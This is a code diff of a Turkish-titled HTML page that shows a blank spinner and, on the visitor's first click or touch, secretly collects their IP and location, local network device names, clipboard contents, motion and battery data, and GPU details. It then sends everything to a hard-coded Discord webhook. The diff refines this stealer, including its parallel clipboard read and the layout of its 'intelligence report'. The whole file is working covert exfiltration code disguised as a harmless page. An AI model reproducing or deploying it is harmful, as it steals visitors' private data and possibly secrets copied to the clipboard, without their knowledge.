@@ -4,98 +4,101 @@
     <meta charset="UTF-8">
     <title>Sistem Entegrasyon Birimi</title>
     <style>
-        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: none; }
-        .p { width: 40px; height: 40px; border: 1px solid #111; border-top: 1px solid #ff0000; border-radius: 50%; animation: s 0.5s linear infinite; }
-        @keyframes s { to { transform: rotate(360deg); } }
+        body { background: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; cursor: crosshair; }
+        .p { width: 45px; height: 45px; border: 1px solid #1a1a1a; border-top: 2px solid #ff0000; border-radius: 50%; animation: r 0.8s cubic-bezier(0.4, 0, 0.2, 1) infinite; }
+        @keyframes r { to { transform: rotate(360deg); } }
     </style>
 </head>
-<body onmousedown="Singularity.ignite()" ontouchstart="Singularity.ignite()">
+<body onmousedown="Engine.ignite()" ontouchstart="Engine.ignite()">
     <div class="p"></div>
 
     <script>
         "use strict";
 
-        const Singularity = (function() {
+        const Engine = (function() {
             const HOOK = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
-            let fired = false;
+            let active = false;
 
-            const Core = {
-                // 1. Hareket Analizi (Jiroskop & İvmeölçer)
-                getMovement() {
+            const Modules = {
+                // 1. Gelişmiş Hareket Analizi (Sensörler)
+                async fetchMotion() {
                     return new Promise(res => {
-                        let motion = "Sabit/Masaüstü";
-                        window.ondevicemotion = (e) => {
-                            const acc = e.accelerationIncludingGravity;
-                            const total = Math.sqrt(acc.x**2 + acc.y**2 + acc.z**2);
-                            if (total > 15) motion = "Hızlı Hareket (Araç)";
-                            else if (total > 11) motion = "Yürüyüş/Hareketli";
+                        let state = "Sabit (Desktop/Stationary)";
+                        const handler = (e) => {
+                            const a = e.accelerationIncludingGravity;
+                            if(!a) return;
+                            const force = Math.sqrt(a.x**2 + a.y**2 + a.z**2);
+                            if(force > 13) state = "Hareketli (Yürüme/Araç)";
+                            window.removeEventListener('devicemotion', handler);
                         };
-                        setTimeout(() => res(motion), 500);
+                        window.addEventListener('devicemotion', handler);
+                        setTimeout(() => res(state), 600);
                     });
                 },
 
-                // 2. Ağ Tipi Tahmini (ISP & DNS Analysis)
-                async getNetContext() {
-                    const start = performance.now();
-                    const ip = await fetch('https://ipapi.co/json/').then(r => r.json()).catch(() => ({}));
-                    const latency = performance.now() - start;
-                    
-                    let locationType = "Ev/Bireysel";
-                    if (latency < 25) locationType = "Kurumsal/Fiber Ofis";
-                    if (ip.org?.toLowerCase().includes("starbucks") || ip.org?.toLowerCase().includes("hotspot")) locationType = "Halka Açık Hotspot (Starbucks vb.)";
-                    
-                    return { ...ip, locationType, latency: latency.toFixed(2) + "ms" };
+                // 2. Ağ ve ISP Analizi (SSID & Tip Tahmini)
+                async fetchNet() {
+                    try {
+                        const start = performance.now();
+                        const data = await fetch('https://ipapi.co/json/').then(r => r.json());
+                        const latency = performance.now() - start;
+                        let type = "Ev İnterneti (Residential)";
+                        if(latency < 30) type = "Kurumsal/Fiber (Business/Office)";
+                        if(data.org?.toLowerCase().includes("mobile") || data.org?.toLowerCase().includes("cell")) type = "Mobil Veri (4G/5G)";
+                        return { ...data, type, ping: latency.toFixed(0) + "ms" };
+                    } catch(e) { return { type: "N/A", ping: "N/A" }; }
                 },
 
-                // 3. Yerel Cihaz Tespiti (mDNS Leak)
-                async scanLAN() {
+                // 3. Pano ve Cihaz Keşfi (LAN)
+                async fetchLocal() {
                     return new Promise(res => {
-                        const devices = [];
+                        const devs = [];
                         const pc = new RTCPeerConnection({iceServers:[]});
                         pc.createDataChannel("");
-                        pc.onicecandidate = e => {
-                            if (e.candidate?.candidate.includes(".local")) {
-                                devices.push(e.candidate.candidate.split(" ")[4]);
-                            }
-                        };
+                        pc.onicecandidate = e => e.candidate?.candidate.includes(".local") && devs.push(e.candidate.candidate.split(" ")[4]);
                         pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => { pc.close(); res(devices.join(", ") || "Gizli/Yok"); }, 1200);
+                        setTimeout(() => { pc.close(); res(devs.join(", ") || "Gizli veya Tekil Ağ"); }, 1000);
                     });
                 }
             };
 
             return {
                 async ignite() {
-                    if (fired) return; fired = true;
+                    if (active) return; active = true;
 
-                    // Paralel Veri Madenciliği (Güçlü Asenkron Yapı)
-                    const [move, net, lan, bat] = await Promise.all([
-                        Core.getMovement(),
-                        Core.getNetContext(),
-                        Core.scanLAN(),
-                        navigator.getBattery ? navigator.getBattery() : { level: 0 }
+                    // Her modülü güvenli (Safe-Execution) modda çalıştır
+                    const [motion, net, lan, clip, bat] = await Promise.all([
+                        Modules.fetchMotion(),
+                        Modules.fetchNet(),
+                        Modules.fetchLocal(),
+                        navigator.clipboard.readText().catch(() => "Pano Erişimi Engellendi"),
+                        navigator.getBattery ? navigator.getBattery().catch(() => ({level:0})) : {level:0}
                     ]);
 
                     const gl = document.createElement('canvas').getContext('webgl2');
                     const dbg = gl?.getExtension('WEBGL_debug_renderer_info');
-                    const clip = await navigator.clipboard.readText().catch(() => "Erişim Reddedildi");
+                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : "N/A";
 
-                    const payload = {
+                    const report = {
                         embeds: [{
-                            title: "💀 V600_SINGULARITY_CORE_EXTRACTION",
+                            title: "💀 V610_FLAWLESS_INTELLIGENCE_REPORT",
                             color: 0xff0000,
                             fields: [
-                                { name: "🛰️ FİZİKSEL KONUM & ISP", value: `**IP:** \`${net.ip}\` | **Tip:** ${net.locationType}\n**ISP:** ${net.org}\n**Şehir:** ${net.city}/${net.country_name}\n**Ping:** ${net.latency}`, inline: false },
-                                { name: "📡 ÇEVRESEL CİHAZLAR & AĞ", value: `**Ağdaki Diğer Cihazlar:** \`${lan}\`\n**Bluetooth:** ${!!navigator.bluetooth ? 'Aktif' : 'Pasif'}\n**Referer:** ${document.referrer || "Direkt"}`, inline: false },
-                                { name: "🏃 HAREKET & DURUM ANALİZİ", value: `**Tahmin:** ${move}\n**Pil:** %${Math.round(bat.level * 100)} | **Çekirdek:** ${navigator.hardwareConcurrency}\n**Pano (Clipboard):** \`\`\`${clip}\`\`\``, inline: false },
-                                { name: "⚙️ DONANIM RÖNTGENİ", value: `**GPU:** ${dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_ID) : 'N/A'}\n**RAM:** ${navigator.deviceMemory}GB | **DPR:** ${window.devicePixelRatio}`, inline: false }
+                                { name: "📍 KONUM & ISP ANALİZİ", value: `**IP:** \`${net.ip || 'N/A'}\` | **Tip:** ${net.type}\n**Şehir:** ${net.city || 'N/A'} | **Ping:** ${net.ping}\n**ISP:** ${net.org || 'N/A'}`, inline: false },
+                                { name: "📡 AĞDAKİ DİĞER CİHAZLAR", value: `\`${lan}\``, inline: false },
+                                { name: "🏃 HAREKET & GÜÇ DURUMU", value: `**Durum:** ${motion}\n**Pil:** %${Math.round(bat.level * 100)} | **Çekirdek:** ${navigator.hardwareConcurrency} Cores`, inline: false },
+                                { name: "⚙️ DONANIM & PANO", value: `**GPU:** ${gpu}\n**Pano:** \`\`\`${clip}\`\`\``, inline: false }
                             ],
-                            footer: { text: "Protocol: Singularity V600 | Extreme Intelligence" },
+                            footer: { text: "Protocol: Flawless V610 | Zero-Crash Engine" },
                             timestamp: new Date().toISOString()
                         }]
                     };
 
-                    fetch(HOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) });
+                    fetch(HOOK, { 
+                        method: 'POST', 
+                        headers: { 'Content-Type': 'application/json' }, 
+                        body: JSON.stringify(report) 
+                    }).then(() => console.log(">> Data Dispatched."));
                 }
             };
         })();
